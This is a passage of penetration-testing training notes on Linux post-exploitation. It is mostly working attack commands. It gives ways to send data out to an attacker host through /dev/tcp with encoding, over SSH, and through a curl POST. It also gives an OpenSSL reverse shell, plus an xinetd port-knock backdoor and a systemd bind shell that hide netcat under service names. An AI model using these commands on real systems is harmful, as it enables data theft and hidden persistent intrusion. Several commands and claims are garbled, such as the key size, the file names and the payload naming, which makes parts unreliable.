In this example, on our target machine, we will simultaneously "tar" (archive) the data, encode it with [Base64](https://en.wikipedia.org/wiki/Base64) and [EBDIC](https://en.wikipedia.org/wiki/EBCDIC) (Extended Binary Coded Decimal Interchange Code) encodings and ship the archive to our attacker system over a TCP socket in order to better obfuscate our traffic.

On our attacker system, we will receive the encoded data via a netcat listener, decode it, and extract the archive.

We can accomplish that with the following steps:
1. On our attacker, system we configure our netcat listener on port TCP/80 to receive incoming data while redirecting the output a *datafolder.tmp* file:
  ```
  nc -nlvp 80 > datafolder.tmp
  ```
2. On our target system, we `tar` the data folder to standard output ([stdout](https://www.cyberciti.biz/faq/redirecting-stderr-to-stdout/)) (-), encode it with both Base64 and EBCDIC, and redirect the data over a local TCP socket to our attacker machine. In the below example, the *datafolder* is the folder containing the data:
  ```
  tar zcf /tmp/datafolder | base64 | dd conv=ebcdic > /dev/tcp/<attacker_IP>/80
  ```
3. On our attacker machine, we decode the received *datafolder.tmp* file from EBCDIC back to ASCII, decode the Base64, and redirect the output to a *datafolder.tar* file:
  ```
  dd conv=ascii if=datafolder.tmp | base64 -d > datafolder.tar
  ```
4. Extract our tar archive:
  ```
  tar xf datafolder.txt
  ```

#### 4.3.2. Exfil over SSH
Another method, a bit more straightforward, and rather than encoded, the data is encrypted since we are using SSH. This method is more likely to evade any on-the-wire heuristics.

Step:
1. On our target system, we tar contents of our `/tmp/datafolder` while sending the output to [stdout](https://www.cyberciti.biz/faq/redirecting-stderr-to-stdout/) (-) and then SSH it over to our attacker system while un-`tar`-ing the contents into the `/tmp/datafolder` directory on the attacker side simultaneously:
  ```
  tar zcf - /tmp/datafolder | ssh root@<attack_IP> "cd /tmp; tar zxpf -"
  ```

2. On our attacker system, the data is already un`tar`-ed an in our `/tmp/datafolder`. We can simply browser to the `/tmp/datafolder` and view our data

For extra "stealthiness", we should configure our SSH server on port 80 for instance.
Just in case the customer is monitoring for SSH traffic over the standard port 22.

#### 4.3.3. Exfiltration via POST Request over HTTPS
The third method has a couple of pre-requisites but is another great way to transfer data over HTTPS/SSL, helping us evade heuristics detection over an encrypted channel.

With this method, we [POST](https://en.wikipedia.org/wiki/POST_(HTTP)) base64-encoded data over HTTPS to a PHP-based web server that is under our control. This method assumes that you have a webserver that is PHP-enabled, and that you have an SSL certificate installed.

Step:
1. On our attacker system, we create a PHP file that will write data being received as a POST request, to a file called `/tmp/datafolder.base64` on our system.
  We will call this file `contact.php` for additional obscurity. The contents of the PHP file (`contact.php`) should be the following, all on single line:
    ```
    <?php file_put_contents('/tmp/datafolder.base64', file_get_contents('php://input')); ?>
    ```

2. From the victim machine, we issue a curl command that will send a POST request consisting of the `tar`ed and base64-encoded data from the victims' `/tmp/datafolder` directory. We send that POST request to our attacker controlled PHP web servers' `contact.php` file over SSL which will write a copy of the base64-encoded tar archieve to a `/tmp/datafolder.base64` file on our attacker system:
  ```
  curl --data "$(tar zcf - /tmp/datafolder | base64)" https://<attacker_server>/contact.php
  ```

3. Our attacker machine has received the POST-ed data, and written it to the `/tmp/datafolder.base64` file. We decode it while redirecting the output to a `datafolder.tar` archive, and extract:
  ```
  cat /tmp/datafolder.base64 | base64 -d > datafolder.tar && tar xf datafolder.txt
  ```
___________________________________
## 4.4. Maintaining Access and Persistence
As we mentioned at the beginning of the previous section, a customer will sometimes require that security controls they have in place to be tested in regards to data exfiltration and maintaining access to systems by having us simulate a real-world attack scenario.

This is to ensure that the controls they have in place can detect an attackers' existence on a system, changes being made to systems, follow the action of an attacker across a network or series of machines, etc.

With the ultimate goal of reducing the amount of damage that could be caused by a realistic threat.

In the slides that follow, we will cover some techniques we can use to maintain access (persist) on a network using some well-known methods in addition to some methods designed specifically for this module.

All of the methods we will cover take advantage of utilities that are already installed on a target Linux machine. The less we need to being to a machine, the better.

As they say "Live off the Land" whenever possible. This reduces our footprint on a compromised host and leaves less of a trail.

#### 4.4.1. Reverse Shells
Reverse Shells are connections that are initiated from a compromised host and connect back to attackers' Command and Control (C2) or in simpler scenarios, to a basic listener service.

We use them all the time, and we probably couldn't live without them.
The following diagram shows a typical reverse shell connection (see img-229)

The most common, which you are probably already familiar with, are pat of the Metasploit exploitation framework (meterpreter_reverse_tcp, shell_reverse_tcp), etc.

Other reverse shells are simply created using netcat from time to time as they are the simplest and quickest to spin up.

While common reverse shells are great for everyday use, they have been tested, tried, and detected which leaves us needing to find new ways to create connections back to our attacker machines using lesser-known methods or methods that might not be necessarily expected.

###### 4.4.1.1. OpenSSL Reverse Shell
One specific method we would like to explore this lesson involves an OpenSSL client and server-based technique in conjunction with what are known as [mkfifo](https://en.wikipedia.org/wiki/Named_pipe#In_Unix) named pipes

  It does require minimal configuration, but in the end, it will help us evade some standard detection mechanisms.

  A `mkfifo` named pipe essentially creates a named instance (a file) of a series of pipe commands, as a file on the filesystem, which can be referenced and used to redirect (<>) output to and form the named pipe (file).
  Take the following steps as an example for creating mkfifo named pipe, that when we send data to it, will automatically create an `out.gz` file containing our data:
    ```
    root@tester:~/tmp# mkfifo a_pipe
    root@tester:~/tmp# gzip -9 -c < a_pipe > out.gz &
    [1] 7187
    root@tester:~/tmp# ls
    root@tester:~/tmp# cat /etc/passwd > a_pipe
    [1]+  Done                  gzip -9 -c < a_pipe > out.gz
    root@tester:~/tmp# ls
    a_pipe  out.gz
    root@tester:~/tmp# gunzip out.gz
    root@tester:~/tmp# ls
    a_pipe  out
    root@tester:~/tmp# cat out
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin  
    sys:x:2:2:sys:/dev:/usr/sbin/nologin  
    ...
    ```
    Description:
    1. `mkfifo a_pipe` : We create our pipe (a_pipe)
    2. `gzip -9 -c < a_pipe > out.gz &` : We create a gzip process which our pipe will listen for input from, and when input is received, will redirect it to a file called "out.gz". We run it as a background process (`&`)
    3. `cat /etc/passwd > a_pipe` : We `cat` the `/etc/passwd` file and redirect the output to our a_pipe which creates `out.gz` file containing our `cat`ed content.
    4. `gunzip out.gz` : We extract our `out.gz` and can see that the `out` contents contained

Now that we have a basic understanding of what a mkfifo pipe is, we can continue to our OpenSSL Reverse Shell.

  What we need to do first, is to generate an SSL certificate key pair for our listener on the attacker machine. We can do that with the following command:
    ```
    openssl req -x509 -newkey rsa:40696 -keyout key.pem -out cert.pem -days 365 -nodes
    ```
    This will create 2 files. A `key.pem` and `cert.pem` file. We will need those for our listener.

  Next, we can start up our listener on the attacker machine using the `openssl s_server` command while specifying our `.pem` files we created:
    ```
    openssl s_server -quiet -key key.pem -cert cert.pem -port 443
    ```
    That will start up an OpenSSL listener with our certificate and associated key on port 443.

  Now, on our target system, we create our `mkfifo` named pipe as a file called `x` in `/tmp` in conjunction with an `openssl s_client -quiet -connect` command that will connect back to our attacker machine, and give us a shell on the victim host (over SSL):
    ```
    mkfifo /tmp/x; /bin/sh -i > /tmp/x 2>&1 | openssl s_client -quiet -connect <attacker_IP>:443 > /tmp/x; rm /tmp/x
    ```

###### 4.4.1.2. ICMP Reverse Shell
Another reverse shell technique which we would like to mention is an "ICMP Reverse Shell" and can be accomplished with a tool known as [icmpsh](https://inquisb.github.io/icmpsh/)

*icmpsh* is based on a *master/slave* setup and will initiate reverse shells to an attacker system using ICMP packets.

We recommend you to take a look at this one as well.

###### 4.4.1.3. Reverse Shell Resources
There are an almost infinite number of resources regarding the creation of reverse shell:
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- https://highon.coffee/blog/reverse-shell-cheat-sheet/

###### 4.4.1.4. Staged vs Stageless Payloads
An important note we would like to make as you experiment with various payloads and reverse shells, is that some sometimes are better to use than other.

For instance, when working with compromised Linux systems specifically and meterpreter payloads, you may encounter instability issues as can be seen with the following Github issue on the subject : https://github.com/rapid7/metasploit-framework/issues/7297

This can be sometimes mitigated by using what are known as *stageless* payloads.

  Stageless payloads are typically larger in size that the standard staged payloads, the primary reason being that they include the payload within the binary, rather than being *pushed* to the target system via the handler once a connection is established.

  Stageless payloads can be identified within Metasploit as their names differ from the payloads we are used to, as an example, below are examples of both staged and stageless payloads:
    ```
    windows/meterpreter/reverse_tcp_uid
    windows/meterpreter/reverse_udp
    windows/meterpreter/reverse_winhttp
    windows/meterpreter/reverse_winhttps
    windows/meterpreter_bind_named_pipe
    windows/meterpreter_bind_tcp
    windows/meterpreter_reverse_http
    windows/meterpreter_reverse_https
    windows/meterpreter_reverse_ipv6_tcp
    windows/meterpreter_reverse_tcp
    ```
    We can see the difference between the two in their naming conventions.
    Stageless payloads use an `-` in their name as can be seen above.

  An excellent [writeup][http://buffered.io/posts/staged-vs-stageless-handlers/] on Staged vs Stageless payloads

#### 4.4.2. Custom Services
For this section, we would like to introduce a couple of persistence methods for maintaining access to systems using already built-in mechanisms of the Linux OS.

###### 4.4.2.1. Xinet UDP Portknock Backdoor
The first method utilizes the built-in [xinetd](https://en.wikipedia.org/wiki/Xinetd) daemon, which is used to manage network-based services on Linux systems.

Xinetd listens for incoming requests to ports we can define, and when a specific request is received, we can have it execute a command of our choosing.

For our purposes, we will create a custom xinetd service, which listens on a UDP port which we can send a single UDP packet to.

  Once the packet is received to the port we define, it will initiate a netcat reverse shell back to our attacker system.

  We are calling it UDP port-knock backdoor because once we knock on our UDP port, it gives us an immediate reverse shell.

  [Port knocking](https://en.wikipedia.org/wiki/Port_knocking) is a well-known concept, but we are implementing it differently, not requiring any third-party software. Another bonus is it will persist across reboots.

To create our xinetd backdoor, we should follow these steps:
1. On the target machine, we are going to create a custom xinetd service.
  We have put together a bash script (`xinetd_server.sh`) you can simply run on the target host, and it can be downloaded [here](https://gist.github.com/anonymous/3cb8e474b6bb3fd3787bda1e1a55cf56).
  (Make sure you modify the `<attacker_IP>` and `<attacker_PORT>`)

  The following script, when executed, will create a new xinetd service called *services-udp*. The *services-udp* custom service will be configured to listen on port 65534 UDP on the target machine. It will also require that netcat (`nc`) is on the target hots in the usual `/bin/` directory. It will copy the `nc` executable to a file called `/bin/services-udp`. We are obscuring netcat as another file in this case.

2. On the attacker machine, simply start up a netcat listener with the same `<attacker_PORT>` you defined in the xinetd_server.sh script before running it.
  In the below example, we are using 4444:
    ```
    nc -nlvp 4444
    ```

3. For the final step, we will use (from our machine) a tool called [hping3](https://tools.kali.org/information-gathering/hping3) to send a single UDP packet to port 65534 on the target host, at which point, our custom *services-udp* netcat binary will be triggered, and send us a reverse shell.
  The hping command we will use is:
    ```
    hping3 -2 -c 1 <target_IP> =p 65534
    ```

(see img-254)


###### 4.4.2.2. Systemd Netcat Bind Shell
The second method for persistence also involves creating a custom service that will also persist across reboots, but this one will be with [Systemd](https://en.wikipedia.org/wiki/Systemd), which has quickly become part of most Linux distributions as a replacement for the [Unix System V init](https://en.wikipedia.org/wiki/Init#SysV-style) system used to launch services and processes and system startup.

The process is somewhat similar to the Xinetd backdoor, but this one will create a **bind shell**, rather than initiate a reverse shell.
  With a bind shell, the attacker directly connects to the bind port and is greeted with a shell.

  So, in regard to the difference between the two, we are initiating a connection to the target for a shell, rather than the target connecting back to our attacker system, as was with xinetd backdoor.

The steps to create Systemd Netcat Bind Shell are as follows:
1. On the target system, we are again going to copy the `/bin/nc` executable, but this time to the `/lib/systemd` directory, and we will call it `systemd-service`:
  ```
  cp /bin/nc /lib/systemd/systemd-service
  ```
2. Still, on the target, we are going to create a file called `/lib/systemd/system/systemd.service` with the following contents:
  ```
  [Unit]
  Description = Systemd Service
  After = network.target
  [Service]
  ExecStart = /lib/systemd/systemd-service -lvp 56825 -e /bin/sh
  [Install]
  WantedBy = multi-user.target
  ```
  The above systemd service configuration file will create bind shell on port 56825 TCP.
3. Enable our new Systemd Netcat Bind Shell service, and start our Systemd Netcat Bind Shell Service:
  ```
  systemctl enable systemd.service
  systemctl start systemd.service
  ```
4. Confirm that our port for our custom service is listening on the target:
  ```
  netstat -auntp | grep 56825
  ```
5. From our attacker machine, we should now be able to connect to port 56825 using netcat and get a shell:
  ```
  netcat <target_IP> 56825
  ```
  This service will persist on reboot and will be listed as "systemd-service" if listing processes 
